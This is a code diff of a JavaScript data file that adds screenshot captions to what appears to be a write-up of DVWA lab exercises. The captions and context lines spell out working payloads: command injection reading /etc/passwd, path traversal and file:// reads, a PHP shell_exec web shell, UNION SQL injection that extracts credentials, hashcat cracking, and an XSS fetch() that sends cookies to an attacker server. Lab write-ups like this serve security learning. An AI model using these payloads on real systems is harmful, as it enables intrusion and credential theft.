@@ -19,12 +19,12 @@ const modules = [
       }
     ],
     images: [
-      ["assets/screenshots/brute-force/01-captured-request.png", "Captured login request"],
-      ["assets/screenshots/brute-force/02-attack-type.png", "Cluster Bomb attack type selected"],
-      ["assets/screenshots/brute-force/03-payload-positions.png", "Username and password payload positions"],
-      ["assets/screenshots/brute-force/04-payload-list.png", "Payload list configured"],
-      ["assets/screenshots/brute-force/05-result.png", "Intruder attack result"],
-      ["assets/screenshots/brute-force/06-length-difference.png", "Different length showing valid response"]
+      ["assets/screenshots/brute-force/01-captured-request.png", "Captured login request", "Captured the DVWA login request in Burp Suite to analyze parameters"],
+      ["assets/screenshots/brute-force/02-attack-type.png", "Cluster Bomb attack type selected", "Attack type: Cluster Bomb — tests all combinations of username and password payloads"],
+      ["assets/screenshots/brute-force/03-payload-positions.png", "Username and password payload positions", "Payload positions set on username and password parameters"],
+      ["assets/screenshots/brute-force/04-payload-list.png", "Payload list configured", "Separate payload lists configured for each position"],
+      ["assets/screenshots/brute-force/05-result.png", "Intruder attack result", "Intruder results sorted — valid credentials identified by different response length"],
+      ["assets/screenshots/brute-force/06-length-difference.png", "Different length showing valid response", "Valid login response has different content length than failed attempts"]
     ]
   },
   {
@@ -46,10 +46,10 @@ const modules = [
       { label: "High Security", code: "127.0.0.1|ls" }
     ],
     images: [
-      ["assets/screenshots/command-injection/01-low-result.png", "Low security command injection result"],
-      ["assets/screenshots/command-injection/02-medium-source.png", "Medium security source code blacklist"],
-      ["assets/screenshots/command-injection/03-medium-bypass.png", "Medium security bypass result"],
-      ["assets/screenshots/command-injection/04-high-source.png", "High security source code bypass point"]
+      ["assets/screenshots/command-injection/01-low-result.png", "Low security command injection result", "Payload: 127.0.0.1; cat /etc/passwd — semicolon chains a second command, dumping /etc/passwd"],
+      ["assets/screenshots/command-injection/02-medium-source.png", "Medium security source code blacklist", "Source code blacklists && and ; but single & operator is not filtered"],
+      ["assets/screenshots/command-injection/03-medium-bypass.png", "Medium security bypass result", "Payload: 127.0.0.1 & cat /etc/passwd — single ampersand bypasses the blacklist"],
+      ["assets/screenshots/command-injection/04-high-source.png", "High security source code bypass point", "Payload: 127.0.0.1|ls — pipe without space bypasses high security filters"]
     ]
   },
   {
@@ -69,10 +69,10 @@ const modules = [
       { label: "Password Change Request", code: "http://localhost/DVWA/vulnerabilities/csrf/?password_new=password&password_conf=password&Change=Change" }
     ],
     images: [
-      ["assets/screenshots/csrf/01-request.png", "Captured CSRF request"],
-      ["assets/screenshots/csrf/02-valid-password.png", "Valid login before change"],
-      ["assets/screenshots/csrf/03-wrong-password.png", "Old password failed after change"],
-      ["assets/screenshots/csrf/04-after.png", "CSRF verification evidence"]
+      ["assets/screenshots/csrf/01-request.png", "Captured CSRF request", "Crafted URL: /vulnerabilities/csrf/?password_new=password&password_conf=password&Change=Change"],
+      ["assets/screenshots/csrf/02-valid-password.png", "Valid login before change", "Password change executed successfully while user session was active"],
+      ["assets/screenshots/csrf/03-wrong-password.png", "Old password failed after change", "Old password no longer works — confirms CSRF attack changed the credentials"],
+      ["assets/screenshots/csrf/04-after.png", "CSRF verification evidence", "New password 'password' now works — CSRF vulnerability confirmed"]
     ]
   },
   {
@@ -96,12 +96,12 @@ const modules = [
       { label: "High Security Bypass", code: "http://localhost/DVWA/vulnerabilities/fi/?page=file:///etc/passwd" }
     ],
     images: [
-      ["assets/screenshots/file-inclusion/01-normal-page.png", "Normal file inclusion page"],
-      ["assets/screenshots/file-inclusion/02-lfi-passwd.png", "Local file inclusion reading /etc/passwd"],
-      ["assets/screenshots/file-inclusion/03-rfi-google.png", "Remote file inclusion test"],
-      ["assets/screenshots/file-inclusion/04-medium-bypass.png", "Medium security bypass"],
-      ["assets/screenshots/file-inclusion/05-high-source.png", "High security source code"],
-      ["assets/screenshots/file-inclusion/06-high-file-bypass.png", "High security file:// bypass"]
+      ["assets/screenshots/file-inclusion/01-normal-page.png", "Normal file inclusion page", "Normal: ?page=file1.php — application loads files based on user-supplied parameter"],
+      ["assets/screenshots/file-inclusion/02-lfi-passwd.png", "Local file inclusion reading /etc/passwd", "LFI Payload: ?page=../../../../../../etc/passwd — directory traversal reads system files"],
+      ["assets/screenshots/file-inclusion/03-rfi-google.png", "Remote file inclusion test", "RFI Payload: ?page=https://google.com — external URL loaded inside the application"],
+      ["assets/screenshots/file-inclusion/04-medium-bypass.png", "Medium security bypass", "Medium Bypass: ?page=..././..././etc/passwd — double traversal bypasses ../ stripping"],
+      ["assets/screenshots/file-inclusion/05-high-source.png", "High security source code", "High security checks if page starts with 'file' — but file:// protocol is still allowed"],
+      ["assets/screenshots/file-inclusion/06-high-file-bypass.png", "High security file:// bypass", "High Bypass: ?page=file:///etc/passwd — file:// protocol reads local files"]
     ]
   },
   {
@@ -124,10 +124,10 @@ const modules = [
       { label: "Root Directory List", code: "http://localhost/DVWA/hackable/uploads/shell.php?cmd=cd%20/;%20ls" }
     ],
     images: [
-      ["assets/screenshots/file-upload/01-shell-code.png", "PHP shell source code"],
-      ["assets/screenshots/file-upload/02-upload-success.png", "shell.php uploaded successfully"],
-      ["assets/screenshots/file-upload/03-pwd-result.png", "pwd command execution"],
-      ["assets/screenshots/file-upload/04-ls-result.png", "ls command execution"]
+      ["assets/screenshots/file-upload/01-shell-code.png", "PHP shell source code", "Shell file: <?php echo shell_exec($_GET['cmd']); ?> — executes any command via URL"],
+      ["assets/screenshots/file-upload/02-upload-success.png", "shell.php uploaded successfully", "File uploaded to: ../../hackable/uploads/shell.php — stored in web-accessible directory"],
+      ["assets/screenshots/file-upload/03-pwd-result.png", "pwd command execution", "URL: shell.php?cmd=pwd — returns current working directory on the server"],
+      ["assets/screenshots/file-upload/04-ls-result.png", "ls command execution", "URL: shell.php?cmd=cd /; ls — lists root directory, proving full RCE"]
     ]
   },
   {
@@ -151,12 +151,12 @@ const modules = [
       { label: "Hashcat", code: "hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt\nhashcat -m 0 hash.txt --show" }
     ],
     images: [
-      ["assets/screenshots/sql-injection/01-show-databases.png", "Database enumeration"],
-      ["assets/screenshots/sql-injection/02-query-explanation.png", "SQL payload explanation"],
-      ["assets/screenshots/sql-injection/03-show-tables.png", "Table enumeration"],
-      ["assets/screenshots/sql-injection/04-show-columns.png", "Column enumeration"],
-      ["assets/screenshots/sql-injection/05-read-users-passwords.png", "User and password hash extraction"],
-      ["assets/screenshots/sql-injection/06-hash-cracking.png", "Hash cracking result"]
+      ["assets/screenshots/sql-injection/01-show-databases.png", "Database enumeration", "Payload: -1' UNION SELECT 1, schema_name FROM information_schema.schemata #"],
+      ["assets/screenshots/sql-injection/02-query-explanation.png", "SQL payload explanation", "UNION-based injection extracts data from information_schema"],
+      ["assets/screenshots/sql-injection/03-show-tables.png", "Table enumeration", "Payload: -1' UNION SELECT 1, table_name FROM information_schema.tables WHERE table_schema='dvwa' #"],
+      ["assets/screenshots/sql-injection/04-show-columns.png", "Column enumeration", "Payload: 1' UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name='users' #"],
+      ["assets/screenshots/sql-injection/05-read-users-passwords.png", "User and password hash extraction", "Payload: 1' UNION SELECT user, password FROM users # — extracts credentials"],
+      ["assets/screenshots/sql-injection/06-hash-cracking.png", "Hash cracking result", "hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt — MD5 hashes cracked"]
     ]
   },
   {
@@ -175,8 +175,8 @@ const modules = [
       { label: "DOM XSS Payload", code: "default=<script>alert('XSS DOM')</script>" }
     ],
     images: [
-      ["assets/screenshots/dom-xss/01-payload.png", "DOM XSS payload in URL"],
-      ["assets/screenshots/dom-xss/02-alert.png", "DOM XSS alert result"]
+      ["assets/screenshots/dom-xss/01-payload.png", "DOM XSS payload in URL", "Payload: default=<script>alert('XSS DOM')</script> — injected via URL parameter"],
+      ["assets/screenshots/dom-xss/02-alert.png", "DOM XSS alert result", "Result: JavaScript alert executed — confirms DOM-Based XSS vulnerability"]
     ]
   },
   {
@@ -196,8 +196,8 @@ const modules = [
       { label: "Cookie Alert", code: "<script>alert(document.cookie)</script>" }
     ],
     images: [
-      ["assets/screenshots/reflected-xss/01-payload.png", "Reflected XSS payload"],
-      ["assets/screenshots/reflected-xss/02-cookie-alert.png", "Cookie alert result"]
+      ["assets/screenshots/reflected-xss/01-payload.png", "Reflected XSS payload", "Payload: <script>alert(document.cookie)</script> — injected in the input field"],
+      ["assets/screenshots/reflected-xss/02-cookie-alert.png", "Cookie alert result", "Result: Session cookie displayed — sensitive browser data accessible via reflected XSS"]
     ]
   },
   {
@@ -216,8 +216,8 @@ const modules = [
       { label: "Stored Cookie Alert", code: "<script>alert(document.cookie)</script>" }
     ],
     images: [
-      ["assets/screenshots/stored-xss/01-message.png", "Stored XSS message"],
-      ["assets/screenshots/stored-xss/02-execution.png", "Stored XSS execution"]
+      ["assets/screenshots/stored-xss/01-message.png", "Stored XSS message", "Payload: <script>alert(document.cookie)</script> — submitted in message field and stored"],
+      ["assets/screenshots/stored-xss/02-execution.png", "Stored XSS execution", "Result: Stored payload executes on page load — cookie alert fires on every visit"]
     ]
   },
   {
@@ -237,8 +237,8 @@ const modules = [
       { label: "Cookie Capture Payload", code: "<script>fetch(\"http://192.168.220.128:8000/?cookie=\" + document.cookie)</script>" }
     ],
     images: [
-      ["assets/screenshots/cookie-stealing/01-server.png", "Python HTTP server started"],
-      ["assets/screenshots/cookie-stealing/02-cookie-log.png", "Cookie received in server log"]
+      ["assets/screenshots/cookie-stealing/01-server.png", "Python HTTP server started", "Attacker server: python3 -m http.server 8000 — listening for incoming cookie data"],
+      ["assets/screenshots/cookie-stealing/02-cookie-log.png", "Cookie received in server log", "Result: Victim's cookie captured in HTTP request log — <script>fetch('...?cookie=' + document.cookie)</script>"]
     ]
   }
 ];
